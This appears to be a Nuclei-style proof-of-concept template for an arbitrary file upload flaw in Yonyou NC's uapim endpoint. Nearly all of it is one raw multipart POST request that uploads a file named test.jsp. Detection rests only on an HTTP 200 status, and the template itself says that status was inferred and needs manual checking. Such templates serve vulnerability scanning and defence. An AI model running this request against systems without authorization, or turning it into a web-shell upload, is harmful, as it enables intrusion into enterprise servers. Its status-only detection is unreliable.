id: poc-2836c7147c2f1da24954
info:
  name: 用友NCuapim任意文件上传
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /uapim/upload/grouptemplet?groupid=abc&fileType=jsp HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Java/1.8.0_371

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 122

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="file"; filename="test.jsp"


    test

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
